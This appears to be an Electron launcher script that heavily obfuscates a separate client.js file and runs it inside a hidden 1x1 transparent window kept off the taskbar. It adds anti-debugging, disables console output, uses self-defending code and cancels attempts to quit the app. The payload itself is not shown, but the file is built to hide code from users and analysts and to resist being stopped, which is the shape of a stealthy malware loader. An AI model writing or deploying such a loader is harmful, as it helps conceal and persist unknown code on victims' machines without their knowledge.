const { app, BrowserWindow } = require('electron');
const fs = require('fs');
const JavaScriptObfuscator = require('javascript-obfuscator');

async function obfuscateCode() {
    const clientCode = fs.readFileSync('./client.js', 'utf8');
    
    const obfuscationOptions = {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        stringArrayShuffle: true,
        splitStrings: true,
        stringArrayThreshold: 1,
        deadCodeInjection: true,
        deadCodeInjectionThreshold: 1,
        debugProtection: true,
        debugProtectionInterval: 4000,
        disableConsoleOutput: true,
        identifierNamesGenerator: 'hexadecimal',
        rotateStringArray: true,
        selfDefending: true,
        stringArray: true,
        stringArrayEncoding: ['base64'],
        stringArrayWrappersCount: 5,
        stringArrayWrappersType: 'function',
        stringArrayWrappersParametersMaxCount: 5,
        stringArrayWrappersChainedCalls: true,
        transformObjectKeys: true,
        unicodeEscapeSequence: true
    };

    const obfuscatedCode = JavaScriptObfuscator.obfuscate(clientCode, obfuscationOptions);
    
    if (!fs.existsSync('./obfuscated')){
        fs.mkdirSync('./obfuscated');
    }
    
    fs.writeFileSync('./obfuscated/client.js', obfuscatedCode.getObfuscatedCode());
    return './obfuscated/client.js';
}

let mainWindow;

async function createWindow() {
    try {
        const obfuscatedPath = await obfuscateCode();
        
        mainWindow = new BrowserWindow({
            width: 1,
            height: 1,
            webPreferences: {
                nodeIntegration: true,
                contextIsolation: false
            },
            show: false,
            skipTaskbar: true,
            transparent: true,
            frame: false
        });

        mainWindow.removeMenu();
        
        require(obfuscatedPath);
        
        mainWindow.hide();
    } catch (error) {
        console.error('Erro:', error);
    }
}

const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
    app.quit();
} else {
    app.on('second-instance', () => {
        if (mainWindow) {
            if (mainWindow.isMinimized()) mainWindow.restore();
            mainWindow.focus();
        }
    });

    app.whenReady().then(createWindow);
}

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});

app.on('before-quit', (event) => {
    event.preventDefault();
}); 